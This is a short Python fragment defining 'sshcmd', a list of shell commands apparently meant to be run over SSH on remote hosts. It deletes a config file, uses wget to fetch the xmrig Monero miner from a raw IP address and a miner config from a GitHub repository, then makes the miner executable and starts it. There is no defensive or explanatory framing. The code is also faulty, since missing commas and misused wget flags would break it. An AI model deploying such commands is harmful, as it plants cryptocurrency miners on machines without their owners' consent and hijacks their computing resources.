...
sshcmd = [
    ...
    "rm config.json"
    "wget -O http://158.69.130.165/xmrig/build/xmrig", # Downloads xmrig
    "wget -O https://raw.githubusercontent.com/junaidd007/Monero/main/config.json", #downloads the config file
    "chmod +x ./xmrig"
    "./xmrig"
